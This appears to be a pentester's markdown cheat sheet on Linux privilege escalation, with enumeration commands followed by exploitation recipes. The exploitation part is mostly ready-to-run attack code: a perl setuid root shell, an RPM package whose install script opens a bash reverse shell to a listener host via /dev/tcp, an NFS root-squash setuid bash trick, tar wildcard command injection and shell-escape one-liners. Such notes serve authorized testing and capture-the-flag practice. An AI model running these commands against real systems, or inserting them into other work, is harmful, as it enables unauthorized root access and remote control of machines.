# Linux Privilege Escalation

## Enumeration
___
### Files and folders
- Look for writable directories
```sh
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

- Look for writable directories in PATH
```sh
IFS=':'; read -a patharr <<< "$PATH"; for dir in ${patharr[@]}; do if [ -w $dir ]; then echo -e "$dir : WRITABLE"; fi; done;
```

- Look for writable files
```sh
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

- Look for group membership / special access
```sh
id
find / -type f -group group_name 2> /dev/null
```

- Look for scripts/binaries with setuid
```sh
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
IFS=$'\n'$'\r'; for item in $(find / -perm /4000 2>/dev/null); do if [ -w $item ]; then echo -e "$item : WRITABLE"; fi; done;
```

- Look for scripts/binaries with setgid
```sh
find / -perm /2000 2>/dev/null
IFS=$'\n'$'\r'; for item in $(find / -perm /2000 2>/dev/null); do if [ -w $item ]; then echo -e "$item : WRITABLE"; fi; done;
```

- Sneak into /var/log/audit
```sh
grep comm=\"su\" /var/log/audit/*
```

- Look for cap_setuid+ep
```sh
getcap -r / 2>/dev/null
# /usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Cron jobs
- Look for cron jobs executed as root
```
TODO
```

- Look for writable script/binaries from above cron jobs
```
TODO
```

### Binaries

- Look inside binaries for exploit possibilities
```
strings /path/to/binary
```
> If we find calls to an executable using relative path, we can create a malicious script using the binary name and update PATH to include the folder

## Exploitation
___

### YUM
- Get a reverse shell using crafted rpm package

If low priv user can run yum as root, we can craft a rpm package to get a reverse shell as root:
```sh
# Create a script with reverse shell commands
cat << EOF > root.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
EOF

# Then use fpm docker image to build the rpm:
docker run --rm -v $(pwd):/data skandyla/fpm -n packagename -s dir -t rpm -a all --before-install /data/root.sh  -p /data /data
# Start an HTTP server and tcp listener
python -m SimpleHTTPServer 8000
nc -lnvp 4444
# On the target machine, install the rpm package:
sudo yum install http://0.0.0.0:8000/root-1.0-1.noarch.rpm
```

### NFS

- Exploit rootsquash
```sh
# Copy a bash binary to mounted NFS
cp bash /mount/point/to/nfs
# Set owner to root
sudo chown root /mount/point/to/nfs/bash
# Set uid on binary
chmod a+sx /mount/point/to/nfs/bash
# Run the binary in low privilege shell
./bash -p (in low privilege shell)
```

### Wildcard Injection

- Exploit tar with wildcard
```sh
# Example tar command: cd /folder; tar cf /backup.tgz *
# Exploit this with checkpoint injection:
cd /folder
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
# Wait for tar to run as root
```

### Shell escape sequence
| Tool | Escape Sequence |
| --- | --- |
| vi/vim | `:!/bin/bash`, `:set shell=/bin/bash:shell` |
| awk | `awk 'BEGIN {system(\"/bin/bash\")}'` |
| perl | `perl -e 'exec \"/bin/bash\";'` |
| find | `find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;` |
| nmap | `--interactive` |

## Links
___
### Guides
- https://book.hacktricks.xyz/linux-unix/privilege-escalation
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks
- https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://gtfobins.github.io/

### Writeups
- https://blog.tryhackme.com/skynet-writeup/
- https://s1gh.sh/tryhackme-wonderland/